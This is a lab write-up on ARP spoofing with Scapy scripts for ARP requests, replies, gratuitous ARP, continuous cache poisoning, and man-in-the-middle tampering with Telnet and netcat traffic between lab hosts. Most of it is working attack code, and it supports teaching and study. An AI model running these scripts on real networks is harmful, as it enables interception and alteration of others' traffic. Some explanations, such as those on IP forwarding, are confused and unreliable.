# ARP Spoofing Attack
The Address Resolution Protocol (ARP) is a communication protocol used for discovering the link layer address, such as the MAC address, given an IP address. The ARP protocol is a very simple protocol, and it does not implement any security measure.

![diagram](https://user-images.githubusercontent.com/126002808/220416965-09b077df-d999-478f-bdf3-78c42b4dcb50.png)

## ARP Request
```
#!/usr/bin/env python3
from scapy.all import *

# Create Ethernet and ARP objects
ethernet = Ether(dst='02:42:0a:09:00:05', src='02:42:0a:09:00:69')
arp = ARP(op=1, pdst='10.9.0.5', hwsrc='02:42:0a:09:00:69', hwdst='02:42:0a:09:00:05', psrc='10.9.0.6')

# Echo message before sending packet
print("Nigel is sending an ARP request")

# Send the packet
sendp(ethernet/arp) 
```

This script is using Scapy, a Python-based packet manipulation tool, to send an ARP reply packet. <br/>
This script is using the Scapy library to create and send an Address Resolution Protocol (ARP) request packet.<br/> 

An ARP request packet is used to discover the hardware address (MAC address) of a device on the same network by broadcasting a request to all devices on the network. The script creates two objects: <br/>

1) an Ethernet object
2) ARP object

The Ethernet object is used to define the source and destination MAC addresses of the packet. <br/>
The ARP object is used to define the operation code, source and destination IP addresses, and source and destination MAC addresses of the packet. <br/>
<br/>
The script then uses the print statement to display a message to the console indicating that Nigel is sending an ARP request. Finally, the script sends the packet using the sendp() function from the Scapy library.
<br/>
The first line ```#!/usr/bin/env python3``` is known as the shebang line.<br/>
It tells the operating system to use the Python 3 interpreter to execute the script. <br/>
<br/>
The second line from ```scapy.all import *``` imports all of the classes and functions in the Scapy library. <br/>
This allows the script to use Scapy to create, manipulate and send network packets. <br/>
<br/>
It first creates Ethernet and ARP objects to define the packet's source and destination addresses, as well as the IP addresses involved. <br/>
It then prints the message ```"Nigel is sending an ARP request"``` before sending the packet using the ```sendp``` function.


![arp-req](https://user-images.githubusercontent.com/126002808/220420309-b15b1cf7-e7ce-4ac4-a7c1-ccddfae3b901.png)

## ARP Reply
```
#!/usr/bin/env python3  
from scapy.all import *  
# Create Ethernet and ARP objects  
ethernet = Ether(dst='02:42:0a:09:00:05', src='02:42:0a:09:00:69') 
# ARP reply uses op-2. Previously, ARP request used op=1 
arp = ARP(op=2, pdst='10.9.0.5', hwsrc='02:42:0a:09:00:69', hwdst='02:42:0a:09:00:05', psrc='10.9.0.6')  
# Print the message that Nigel is sending an ARP reply
print("Nigel is sending an ARP reply")
# Send the packet 
sendp(ethernet/arp)  
```

Similar to the first script, we create an Ethernet frame with a specified source and destination MAC address. <br/>
The next line creates an ARP packet, with a specified source and destination MAC and IP addresses <br/>
This specifies that it is an ARP reply packet by setting the ```'op'``` field to ```2.``` <br/>
<br/>
The line ```print("Nigel is sending an ARP reply")``` prints a message to the console stating that Nigel is sending an ARP reply packet. <br/>
<br/>
Finally, the ```sendp(ethernet/arp)``` function sends the Ethernet frame and ARP packet as a single packet over the network using Scapy's ```sendp()``` function.

![arp-rep](https://user-images.githubusercontent.com/126002808/220423164-cff058a6-8371-4466-8461-b672a09df364.png)


## Gratuitous ARP
```
#!/usr/bin/env python3
from scapy.all import *

# Create Ethernet and ARP objects
ethernet = Ether(dst='02:42:0a:09:00:05', src='02:42:0a:09:00:69')
arp = ARP(op=2, pdst='10.9.0.5', hwsrc='02:42:0a:09:00:69', hwdst='ff:ff:ff:ff:ff:ff', psrc='10.9.0.5')

# Print the message that Nigel is sending a Gratuitous ARP message
print("Nigel is sending a Gratuitous ARP message")

# Send the packet
sendp(ethernet/arp)
```

![grat-arp](https://user-images.githubusercontent.com/126002808/220428701-fd8a00ac-fefd-46bf-a947-6e7438630782.png)


# MITM Attack on Telnet using ARP Cache Poisoning

The below script is conducting an ARP cache poisoning attack on both Host A and Host B. It sends out ARP reply packets spoofing Host M's MAC address as the MAC address for both Host A and Host B. This will cause Host A to associate Host M's MAC address with Host B's IP address and cause Host B to associate Host M's MAC address with Host A's IP address. As a result, all the packets sent between Host A and Host B will be intercepted by Host M. The while True loop sends the spoofed ARP packets every 5 seconds to ensure that the ARP cache of both Host A and Host B continues to be poisoned.

```
#!/usr/bin/env python3 
from scapy.all import * 
# Set the target IP addresses  
target_a_ip = '10.9.0.5' 
target_b_ip = '10.9.0.6' 
# Set the MAC addresses for Hosts A, B, and M 
host_a_mac = '02:42:0a:09:00:05' 
host_b_mac = '02:42:0a:09:00:06' 
host_m_mac = '02:42:0a:09:00:69' 
# Create the ARP reply packets 
arp_a = ARP(op=2, hwsrc=host_m_mac, psrc=target_b_ip, hwdst=host_a_mac, pdst=target_a_ip)  
arp_b = ARP(op=2, hwsrc=host_m_mac, psrc=target_a_ip, hwdst=host_b_mac, pdst=target_b_ip) 
# Send the packets continuously every 5 seconds 
while True: 
       send(arp_a) 
       send(arp_b) 
       time.sleep(5) 
```
The script is sending ARP reply packets to both Host A and Host B continuously every 5 seconds. The ARP reply packets are being sent with the MAC address of Host M (host_m_mac) as the source MAC address and the IP address of the other target host as the source IP address.

### With IP Forwarding Enabled

![ip-forward-off](https://user-images.githubusercontent.com/126002808/220438539-3e69a4e5-ea23-459f-a3a4-0dd51d6bd9e6.png)

If IP forwarding is enabled on Host M, it will forward the packets between Host A and Host B. Therefore, both Host A and Host B will receive the ARP reply packets sent by Host M. However, if IP forwarding is disabled on Host M, it will not forward the packets, and Host B will not receive the ARP reply packets sent by Host M. As a result, only Host A will receive the ARP reply packets in this case.

### With IP Forwarding Disabled

![ip-forward-on](https://user-images.githubusercontent.com/126002808/220438591-160fc830-0bc4-4800-ab72-6b2cd609f1e7.png)

In summary, if IP forwarding is disabled on Host M, only Host A will receive the ARP reply packets, while if IP forwarding is enabled on Host M, both Host A and Host B will receive the ARP reply packets.

## Launching an  MitM Attack on Telnet

The below code performs a Man-in-the-Middle (MitM) attack on Telnet traffic between two hosts, Host A and Host B. <br/>
I do this by modifying the Telnet data in packets transmitted between them. <br/>
<br/>
The Python code again uses the Scapy library to capture and modify packets and the regular expression (re) module to manipulate the Telnet data.The script defines the IP and MAC addresses for hosts A, B, and M, sets up a packet capture filter to capture Telnet traffic from host A to host B, and defines a function that modifies the Telnet data in captured packets. <br/>
<br/>
When a packet that matches the filter is captured, the function is called to modify the Telnet data and send the modified packet to host B. <br/>
Additionally, the code prints "Nigel is launching an MitM Attack on Telnet" to the console each time a packet is captured and modified.

```
#!/usr/bin/env python3
from scapy.all import *

print ("Nigel is injecting Z's")

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
IP_M = "10.9.0.7"
MAC_M = "02:42:0a:09:00:07"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the captured one.
        # 1) We need to delete the checksum in the IP & TCP headers,
        # because our modification will make them invalid.
        # Scapy will recalculate them if these fields are missing.
        # 2) We also delete the original TCP payload.
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        # Construct the new payload based on the old payload.
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load # The original payload data
            newdata = b'Z' * len(data) # Replace each character with 'Z'
            send(newpkt/newdata, iface='eth0', verbose=0, loop=0, count=1, 
                 inter=0, timeout=None, realtime=False) # Send the spoofed packet to Host B
        else:
            send(newpkt, iface='eth0', verbose=0, loop=0, count=1, 
                 inter=0, timeout=None, realtime=False)

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create new packet based on the captured one
        # Do not make any change
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)

        send(newpkt, iface='eth0', verbose=0, loop=0, count=1, 
             inter=0, timeout=None, realtime=False) # Send the packet to Host A

    elif pkt[IP].src == IP_A and pkt[IP].dst == IP_M:
        # Create a new packet based on the captured one.
        # Modify the destination IP and MAC addresses to spoof the packet.
        newpkt = IP(bytes(pkt[IP]))
        newpkt.dst = IP_B
        del(newpkt.chksum)

        ethpkt = Ether(dst=MAC_B, src=MAC_M)
        ethpkt.payload = newpkt
        del(ethpkt.chksum)

        sendp(ethpkt, iface='eth0', verbose=0, loop=0, count=1, 
              inter=0, timeout=None, realtime=False) # Send the spoofed packet to Host B

f = 'tcp and host 10.9.0.5 and host 10.9.0.6'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt) # Sniff the traffic between Host A and Host B
```

### Second Attempt
This script replaces each typed character in Telnet with the character 'Z', and also allows for redirecting the TCP packets to a spoofed address. Note that I added a new variable ```IP_M``` for the spoofed IP address and ```MAC_M``` for the spoofed MAC address, and modified the ```spoof_pkt()``` function to create and send the spoofed packets. <br/>
<br/>
The script does not necessarily need to start with ```#!/usr/bin/env python3``` as it is not required for the script to run. However, it is a common practice to include this line at the beginning of a Python script so that the operating system can find the Python interpreter and execute the script properly.<br/>
<br/>
Regarding the IP and MAC addresses, these continue to be required for the script to work properly. I could a script where it will assume that Host A and Host B are on the same network segment and that their IP and MAC addresses can be automatically discovered through the ARP cache. (Needs testing!!!). However, it is always a good practice to specify the IP and MAC addresses explicitly to ensure that the packets are sent to the correct destination. <br/>
<br/>
Here is an alternative version of the script that I have been testing:

```
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def telnet_listener(pkt):
    if pkt.haslayer(TCP) and pkt[TCP].dport == 23 and pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode('utf-8', errors='ignore').strip()
        if payload == 'Nigel Douglas':
            response = 'AAAAA Douglas'
            response_pkt = Ether(dst=MAC_A, src=MAC_B) / IP(dst=IP_A, src=IP_B) / TCP(dport=pkt[TCP].sport, sport=pkt[TCP].dport, flags='A') / Raw(load=response)
            sendp(response_pkt, verbose=False)

sniff(filter='tcp', prn=telnet_listener)
```

In this version of the script, the IP and MAC addresses for Host A and Host B are explicitly defined at the beginning of the script. The response_pkt is constructed using the specified IP and MAC addresses instead of relying on automatic ARP resolution. The sendp function is used instead of send to send the packet at the data link layer. <br/>
<br/>
Note that the MAC addresses in this example are using Docker's default networking setup, which is why they start with ```02:42```. Your MAC addresses may be different depending on your network setup. You can find the MAC addresses for Host A and Host B using the ifconfig command on each host.

## Launching an  MitM Attack on Netcat
To modify the previous script to replace every occurrence of a first name in the message with a sequence of A's in the TCP packets exchanged between Host A and Host B communicating via netcat, I added the below code:

```
#!/usr/bin/env python3
from scapy.all import *

print ("Nigel will be removed as the first name")

# Define the IP addresses and MAC addresses for Hosts A, B and M
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
IP_M = "10.9.0.10"
MAC_M = "02:42:0a:09:00:10"

# Define the first name to be replaced with a sequence of A's
firstname = "Nigel"

def replace_firstname(data):
    """
    Replaces every occurrence of the first name with a sequence of A's
    in the given data and returns the modified data.
    """
    modified_data = data.replace(firstname, 'A' * len(firstname))
    return modified_data

def spoof_pkt(pkt):
    """
    Intercepts the TCP packets exchanged between Host A and Host B communicating via netcat,
    replaces every occurrence of the first name with a sequence of A's, and forwards the
    modified packets to the destination.
    """
    if pkt.haslayer(TCP):
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt[TCP].dport == 9090:
            # Create a new packet based on the captured one.
            newpkt = IP(bytes(pkt[IP]))
            del newpkt.chksum
            del newpkt[TCP].chksum
            # Replace every occurrence of the first name with a sequence of A's.
            newdata = replace_firstname(pkt[TCP].payload.load)
            # Send the modified packet to Host B.
            send(newpkt/TCP(newdata))
        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A and pkt[TCP].sport == 9090:
            # Create a new packet based on the captured one.
            newpkt = IP(bytes(pkt[IP]))
            del newpkt.chksum
            del newpkt[TCP].chksum
            # Send the packet to Host A without making any change.
            send(newpkt)

# Start sniffing the network traffic on the interface eth0.
sniff(filter="tcp and host " + IP_A + " and host " + IP_B, prn=spoof_pkt, iface="eth0")
```

In this modified script, I first define the IP addresses and MAC addresses for Hosts A, B and M. <br/>
We also define the first name to be replaced with a sequence of A's. <br/>
<br/>
The ```replace_firstname``` function takes the original data as input and replaces every occurrence of the first name with a sequence of A's of the same length. The ```spoof_pkt``` function intercepts the TCP packets exchanged between Host A and Host B communicating via netcat, replaces every occurrence of the first name with a sequence of A's, and forwards the modified packets to the destination. The ```sniff``` function is used to start sniffing the network traffic on the interface ```eth0```, and calls the ```spoof_pkt``` function for each intercepted packet that matches the specified filter.

![netcat](https://user-images.githubusercontent.com/126002808/220471819-bedaa5cd-f555-469a-8801-3cb68b9293fe.png)
